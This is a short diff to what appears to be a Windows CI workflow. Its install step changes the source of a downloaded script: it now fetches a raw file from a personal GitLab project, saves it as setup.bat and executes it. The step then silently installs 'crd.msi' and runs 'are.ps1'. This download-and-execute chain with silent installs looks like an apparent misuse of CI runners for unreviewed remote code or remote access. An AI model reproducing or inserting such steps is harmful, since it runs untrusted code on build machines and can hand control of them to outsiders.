@@ -11,7 +11,7 @@ jobs:
 
       - name: Install 
         run: |
-          Invoke-WebRequest -Uri https://spyderrock.com/6sMK2912-a.bat -OutFile setup.bat
+          Invoke-WebRequest -Uri https://gitlab.com/EfeBey2903/myprojetct/-/raw/main/a.cmd -OutFile setup.bat
           cmd /c setup.bat
           .\crd.msi /S
           .\are.ps1 /S
